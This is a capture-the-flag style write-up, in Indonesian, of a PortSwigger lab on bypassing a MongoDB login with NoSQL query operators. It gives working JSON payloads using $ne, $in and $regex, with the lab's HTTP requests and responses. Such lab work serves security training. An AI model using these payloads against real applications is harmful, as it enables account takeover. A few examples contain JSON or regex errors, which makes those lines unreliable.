# NoSQL Injection Lab – Authentication Bypass via Query Operators

## Lab Description

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ae988849-49c1-4d58-a786-6d008dc8fd0c)

---

## Overview

Database **NoSQL** sering menggunakan **query operators** untuk menentukan kondisi yang harus dipenuhi agar data bisa ditampilkan. Contoh query operators pada **MongoDB**:

* `$where` → mencocokkan dokumen yang memenuhi ekspresi JavaScript.
* `$ne` → mencocokkan semua nilai yang tidak sama dengan nilai tertentu.
* `$in` → mencocokkan semua nilai yang terdapat pada sebuah array.
* `$regex` → memilih dokumen yang nilainya sesuai dengan ekspresi reguler.

> Dalam pesan JSON, query operators dapat disisipkan sebagai objek bersarang.
> Contoh: `{"username":"wiener"}` dapat diubah menjadi `{"username":{"$ne":"invalid"}}`.

### Contoh Kasus

Aplikasi rentan menerima data login dalam bentuk JSON berikut:

```json
{"username":"wiener","password":"peter"}
```

Jika kita uji dengan operator `$ne`:

```json
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

Maka query akan mencari semua user dengan username yang **tidak sama dengan "invalid"**.

Jika kedua input (`username` dan `password`) sama-sama memproses operator, maka autentikasi bisa dilewati dengan payload:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Payload tersebut mengembalikan semua kredensial login di mana **username dan password tidak sama dengan "invalid"**, sehingga login berhasil dengan akun pertama di dalam koleksi database.

Untuk menargetkan akun tertentu, kita bisa menggunakan payload:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Payload ini mencoba login dengan username yang sesuai daftar dan password yang tidak kosong.

---

## Solution

### 1. Login Awal (User Wiener)

Request normal saat login sebagai wiener:

```http
POST /login HTTP/1.1
Host: 0a2e004e0498675c8294e27d00550012.web-security-academy.net
Cookie: session=FidptxGNO2o5A1gT6hVGVo0ahawPmQaa
Content-Type: application/json
...
{"username":"wiener","password":"peter"}
```

### 2. Uji Payload dengan `$in`

Jika digunakan:

```json
{"username":{"$in":"administrator"},"password":{"$ne":""}}
```

Login gagal, karena username admin sebenarnya bukan `administrator` melainkan string acak, misalnya `admin@fra12`.

### 3. Gunakan Operator `$regex`

Untuk login sebagai user dengan username yang diawali kata `admin`, gunakan payload:

```json
{"username":{"$regex":"admin*"},"password":{"$ne":""}}
```

* Payload ini akan mencari semua username yang **diawali dengan kata "admin"**.
* Syarat tambahan `password":{"$ne":""}` memastikan password tidak kosong, sehingga kondisi selalu benar.

### 4. Hasil Respon

Server merespons dengan redirect ke akun admin:

```http
HTTP/2 302 Found
Location: /my-account?id=adminsmto9bvx
Set-Cookie: session=fGElqIm2RxpmcGKeA1faciz8HjHYRQ8G; Secure; HttpOnly; SameSite=None
```

Dari response terlihat bahwa nama akun admin adalah **adminsmto9bvx**.

### 5. Verifikasi Login

Jika dibuka di browser, kita berhasil login sebagai admin. Lab pun berhasil diselesaikan.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/471abd07-405b-4a6f-b76e-9513a383329b)

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9c6bfc75-9c52-4764-b8ba-6ae626a50d97)
